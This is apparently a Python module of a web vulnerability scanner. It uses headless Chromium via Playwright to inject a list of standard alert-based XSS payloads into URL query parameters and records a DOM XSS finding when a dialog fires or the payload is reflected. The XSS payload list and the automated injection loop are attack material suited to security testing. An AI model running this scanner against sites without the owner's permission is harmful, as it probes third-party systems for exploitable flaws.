"""
modules/browser_automation.py
-----------------------------
Playwright-based DOM XSS + SPA analysis.
Loads JS-heavy pages, watches for:
- Alert / confirm / prompt dialogs (XSS indicators)
- DOM mutations reflecting payloads
- Network requests triggered by payloads

Graceful: skips if playwright not installed.
"""

import time
from typing import List, Dict, Optional
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from core.logger import get_logger, info, ok, warn, skip
from core.utils import read_lines, write_lines, has_tool
from modules._common import load_urls, module_dir, save_finding, cli_main

log = get_logger("browser_automation")


XSS_PAYLOADS = [
    "<script>alert('PAYLOAD')</script>",
    "\"><svg/onload=alert('PAYLOAD')>",
    "javascript:alert('PAYLOAD')",
    "'-alert('PAYLOAD')-'",
    "<img src=x onerror=alert('PAYLOAD')>",
]


def _playwright_available() -> bool:
    try:
        import playwright  # noqa
        return True
    except ImportError:
        return False


def test_url_with_browser(url: str, timeout_ms: int = 15000) -> List[Dict]:
    """
    Load URL, mutate params with XSS payloads, watch for alerts.
    """
    findings: List[Dict] = []
    if not _playwright_available():
        return findings

    try:
        from playwright.sync_api import sync_playwright, TimeoutError as PWTimeout
    except Exception:
        return findings

    p = urlparse(url)
    qs = parse_qs(p.query)
    if not qs:
        return findings

    for param in qs:
        for payload_template in XSS_PAYLOADS:
            marker = f"PP{int(time.time())}"
            payload = payload_template.replace("PAYLOAD", marker)
            try:
                new_qs = dict(qs)
                new_qs[param] = [payload]
                new_url = urlunparse((p.scheme, p.netloc, p.path,
                                      p.params, urlencode(new_qs, doseq=True), ""))
            except Exception:
                continue

            dialog_fired = {"flag": False}

            try:
                with sync_playwright() as pw:
                    browser = pw.chromium.launch(headless=True)
                    context = browser.new_context(ignore_https_errors=True)
                    page = context.new_page()

                    def on_dialog(d):
                        if marker in (d.message or ""):
                            dialog_fired["flag"] = True
                        d.dismiss()

                    page.on("dialog", on_dialog)
                    try:
                        page.goto(new_url, timeout=timeout_ms, wait_until="domcontentloaded")
                        page.wait_for_timeout(1500)
                    except PWTimeout:
                        pass
                    except Exception:
                        pass

                    # Also check DOM
                    try:
                        content = page.content()
                        if marker in content and "<script>" in content.lower():
                            dialog_fired["flag"] = True
                    except Exception:
                        pass

                    browser.close()

                if dialog_fired["flag"]:
                    findings.append({
                        "type": "dom_xss",
                        "url": new_url,
                        "param": param,
                        "payload": payload,
                        "evidence": f"JS dialog/DOM reflected with marker '{marker}'",
                        "severity": "high",
                        "confidence": 80,
                    })
                    return findings  # one confirmed hit is enough per URL
            except Exception as e:
                log.debug(f"browser test failed {new_url}: {e}")

    return findings


def run(domain: str, output_root: str = "results",
        scan_id: Optional[int] = None,
        max_urls: int = 10) -> Dict:
    mdir = module_dir(domain, "browser_automation", output_root)

    if not _playwright_available():
        skip("playwright not installed — browser_automation skipped")
        return {"count": 0, "findings": [], "skipped": True}

    urls = load_urls(domain, output_root)
    candidates = [u for u in urls if "?" in u and "=" in u][:max_urls]
    if not candidates:
        info("No parameter URLs to test with browser")
        return {"count": 0, "findings": []}

    info(f"Browser-testing {len(candidates)} URLs (headless chromium)")
    findings: List[Dict] = []

    for url in candidates:
        try:
            for f in test_url_with_browser(url):
                findings.append(f)
                save_finding(domain, "browser_automation", f["type"], f["severity"],
                             f["url"], param=f["param"], payload=f["payload"],
                             evidence=f["evidence"], confidence=f["confidence"],
                             scan_id=scan_id, output_root=output_root)
                warn(f"DOM XSS: {f['url']}")
        except Exception as e:
            log.debug(f"browser module error: {e}")

    if findings:
        write_lines(mdir / "dom_xss_findings.txt",
                    [f"[{f['severity']}] {f['url']}" for f in findings])

    return {"count": len(findings), "findings": findings}


if __name__ == "__main__":
    import argparse
    p = argparse.ArgumentParser()
    p.add_argument("-t", "--target", required=True)
    p.add_argument("-o", "--output", default="results")
    p.add_argument("--max-urls", type=int, default=10)
    args = p.parse_args()
    cli_main(args.target, "browser_automation",
             lambda domain, output_root: run(domain, output_root,
                                             max_urls=args.max_urls),
             args.output)